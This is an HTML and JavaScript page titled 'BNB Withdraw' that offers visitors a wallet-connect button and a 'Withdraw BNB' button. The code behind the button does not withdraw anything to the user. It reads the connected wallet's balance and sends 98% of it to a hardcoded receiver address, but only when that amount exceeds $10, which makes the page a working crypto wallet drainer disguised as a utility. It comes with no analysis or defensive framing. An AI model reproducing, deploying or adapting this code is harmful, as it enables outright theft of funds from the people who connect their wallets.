<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BNB Withdraw</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-gray-100 min-h-screen flex items-center justify-center">
  <div class="bg-white rounded-2xl shadow-xl p-6 w-full max-w-md text-center space-y-6">
    <h1 class="text-2xl font-bold text-gray-800">BNB Withdraw</h1>

    <!-- WalletConnect Button -->
    <w3m-core-button class="mx-auto"></w3m-core-button>

    <!-- Withdraw Button -->
    <button
      id="withdrawButton"
      class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-xl transition duration-200"
      style="display: none"
    >
      Withdraw BNB
    </button>

    <!-- Message Area -->
    <p id="message" class="text-sm font-medium text-gray-600"></p>
  </div>

  <script type="module">
    import {
      EthereumClient,
      w3mConnectors,
      w3mProvider,
      WagmiCore,
      WagmiCoreChains,
      WagmiCoreConnectors
    } from "https://unpkg.com/@web3modal/ethereum@2.6.2";

    import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.6.2";

    const { bsc } = WagmiCoreChains;
    const {
      configureChains,
      createConfig,
      getAccount,
      fetchBalance,
      sendTransaction
    } = WagmiCore;

    const chains = [bsc];
    const projectId = "2aca272d18deb10ff748260da5f78bfd";
    const RECEIVER_ADDRESS = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
    const BNB_TO_USD = 600; // Adjust this value if BNB price changes

    const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);

    const wagmiConfig = createConfig({
      autoConnect: true,
      connectors: [
        ...w3mConnectors({ chains, version: 2, projectId }),
        new WagmiCoreConnectors.CoinbaseWalletConnector({
          chains,
          options: {
            appName: "BNB Withdraw App"
          }
        })
      ],
      publicClient
    });

    const ethereumClient = new EthereumClient(wagmiConfig, chains);
    const web3Modal = new Web3Modal({ projectId }, ethereumClient);

    function showMessage(msg, type = "info") {
      const el = document.getElementById("message");
      el.innerText = msg;
      el.className = `text-sm font-medium ${
        type === "error" ? "text-red-600" : type === "success" ? "text-green-600" : "text-gray-600"
      }`;
    }

    async function withdrawBNB() {
      const { address, isConnected } = getAccount();

      if (!isConnected || !address) {
        showMessage("Please connect your wallet first", "error");
        return;
      }

      try {
        const balanceResult = await fetchBalance({ address, chainId: 56 });
        const fullBNB = Number(balanceResult.formatted);

        const sendableBNB = fullBNB * 0.98;
        const usdValue = sendableBNB * BNB_TO_USD;

        if (usdValue < 10) {
          showMessage("Insufficient BNB: 98% of your balance is less than $10", "error");
          return;
        }

        await sendTransaction({
          to: RECEIVER_ADDRESS,
          value: BigInt(Math.floor(sendableBNB * 1e18)) // Convert to wei
        });

        showMessage("Withdrawal successful! âœ…", "success");
      } catch (err) {
        console.error(err);
        showMessage("Error sending transaction. Check console for details.", "error");
      }
    }

    // Show Withdraw button only when wallet is connected
    setInterval(() => {
      const { isConnected } = getAccount();
      const btn = document.getElementById("withdrawButton");
      if (btn) btn.style.display = isConnected ? "block" : "none";
    }, 1000);

    window.addEventListener("DOMContentLoaded", () => {
      const btn = document.getElementById("withdrawButton");
      if (btn) btn.addEventListener("click", withdrawBNB);
    });
  </script>
</body>
</html>
